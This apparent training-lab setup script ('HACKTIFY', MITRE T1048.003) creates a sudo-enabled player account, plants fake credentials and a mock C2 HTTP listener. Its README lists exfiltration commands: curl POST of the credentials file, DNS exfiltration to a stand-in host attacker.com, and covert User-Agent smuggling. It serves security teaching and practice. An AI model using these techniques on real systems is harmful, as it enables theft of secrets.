#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{HTTP_EXFIL_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-ex; chmod 440 /etc/sudoers.d/player-ex
# Create sensitive data to exfiltrate
mkdir -p /opt/sensitive-data
echo "$FLAG" > /opt/sensitive-data/credentials.txt
echo "db_password=Sup3rS3cr3t!" >> /opt/sensitive-data/credentials.txt
echo "api_key=sk-hacktify-1234567890" >> /opt/sensitive-data/credentials.txt
echo "server=192.168.1.100" >> /opt/sensitive-data/credentials.txt
chmod 644 /opt/sensitive-data/credentials.txt
# Start a mock "C2 server" (HTTP listener on port 8888)
cat > /tmp/start_c2.sh << 'C2EOF'
#!/bin/bash
# Simple HTTP receiver for exfil demo
mkdir -p /tmp/c2_received
cd /tmp/c2_received
python3 -m http.server 8888 &
echo $! > /tmp/c2_pid.txt
echo "[+] C2 HTTP listener started on port 8888 (PID: $(cat /tmp/c2_pid.txt))"
C2EOF
chmod +x /tmp/start_c2.sh
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1048.003 Exfiltration Over Unencrypted Protocol (HTTP) ===
Login  : player / Player@123
Goal   : Exfiltrate /opt/sensitive-data/credentials.txt using HTTP methods.
         1. Start a mock C2 receiver: bash /tmp/start_c2.sh
         2. Exfiltrate via curl POST: curl -X POST http://localhost:8888/ -d @/opt/sensitive-data/credentials.txt
         3. Exfiltrate via DNS simulation: nslookup $(cat file | base64 | head -c40).attacker.com
         4. Exfiltrate via User-Agent header (covert): curl -A "$(cat file)" http://localhost:8888/
         5. Check /tmp/c2_received/ for received data
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1048.003 setup complete."
